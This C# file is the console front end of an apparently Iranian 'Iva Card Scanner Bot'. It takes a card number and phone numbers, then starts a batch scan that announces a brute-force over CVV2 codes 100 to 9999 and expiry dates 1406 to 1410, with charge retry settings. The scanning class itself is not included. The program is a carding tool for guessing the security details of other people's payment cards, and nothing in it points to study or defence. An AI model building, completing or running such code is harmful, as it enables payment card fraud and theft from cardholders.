using System;
using System.Linq;
using System.Threading.Tasks;

namespace IvaScanner
{
    class Program
    {
        static async Task Main(string[] args)
        {
            Console.Title = "Iva Scanner Bot - Full Scan";
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("========================================");
            Console.WriteLine("       Iva Card Scanner Bot");
            Console.WriteLine("       Full CVV2 + Expiry Scan");
            Console.WriteLine("========================================");
            Console.ResetColor();
            Console.WriteLine();

            var scanner = new IvaScannerBot(new IvaOptions
            {
                AppVersion = "3.10.24",
                MaxChargeRetries = 5,
                ChargeRetryDelay = TimeSpan.FromMilliseconds(500)
            });

            while (true)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write("Enter card number (16 digits): ");
                Console.ResetColor();
                var pan = Console.ReadLine()?.Replace(" ", "").Replace("-", "");

                if (string.IsNullOrEmpty(pan) || pan.Length != 16 || !pan.All(char.IsDigit))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("❌ Invalid card number! Must be 16 digits.");
                    Console.ResetColor();
                    continue;
                }

                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write("Enter phone numbers (comma separated): ");
                Console.ResetColor();
                var phonesInput = Console.ReadLine()?.Trim();
                var phones = string.IsNullOrEmpty(phonesInput) 
                    ? new[] { "09123456789" } 
                    : phonesInput.Split(',').Select(p => p.Trim()).ToArray();

                Console.WriteLine($"\n[+] Starting scan for {pan} with {phones.Length} numbers...");
                Console.WriteLine($"[+] CVV2 range: 100 to 9999");
                Console.WriteLine($"[+] Expiry: 1406 to 1410");
                Console.WriteLine($"[+] This will take a VERY LONG time!");
                Console.WriteLine($"[+] Press Ctrl+C to cancel at any time.\n");

                await scanner.BatchScanAsync(pan, phones);

                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write("\nScan again? (y/n): ");
                Console.ResetColor();
                var again = Console.ReadLine()?.ToLower();
                if (again != "y") break;
                Console.Clear();
            }

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\nGoodbye!");
            Console.ResetColor();
        }
    }
}